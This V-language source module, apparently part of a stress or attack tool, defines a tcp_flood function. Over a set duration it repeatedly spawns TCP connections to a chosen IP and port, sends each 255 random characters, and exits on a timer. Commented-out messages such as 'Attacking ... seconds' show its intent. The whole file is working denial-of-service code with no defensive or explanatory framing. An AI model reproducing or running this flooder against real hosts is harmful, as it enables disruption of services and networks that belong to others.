module methods 

import os
import net
import time
import rand

pub fn tcp_flood(ip string, port string, ttime string)
{
    go tcp_timer(ttime.int())
    // println("Attacking ${args[1]}:${args[2]} for ${args[3]} seconds.....")

    mut c := 0
    for
    {
        if c == 10 { c = 0 }
        if c < 4 {
                spawn req_tcp(ip, port)
        }
        // print("${c} | Attacking...\r")
        c++
    }
    // print("Attack Done.....")
}

fn tcp_timer(max int) {
    time.sleep(max*time.second)
    exit(0)
}

/*
    This function will only make a single request to an IP
*/
fn req_tcp(ip string, port string)
{
    mut c := net.dial_tcp("${ip}:${port}") or { &net.TcpConn{} }
    c.write_string(randomizeu_hex(255)) or { 0 }
    c.close() or { return }
}

fn randomizeu_hex(hex_sz int) string
{
    mut new_hex := ""
    chars := "qwertyuiopasdfghjklzxcvbnm1234567890-=`[]\\;',./<>?L●☻☺♠♣♥♦♪◘№℅Ω™℮℗₸₷₵₳₴₱₲₿₥₤₣:\"{}|_+~╓╔®╕╖╗©╘╙╚╛╜╝╞╟╠╡╢╣╤╥╦╧╨╩╪╫╬▀▄█▌▐░▒▓►▼◄▲".split("")
    for _ in 0..hex_sz
    {
        num := rand.int_in_range(0, chars.len) or { 0 }
        new_hex += chars[num]
    }
    return new_hex
}

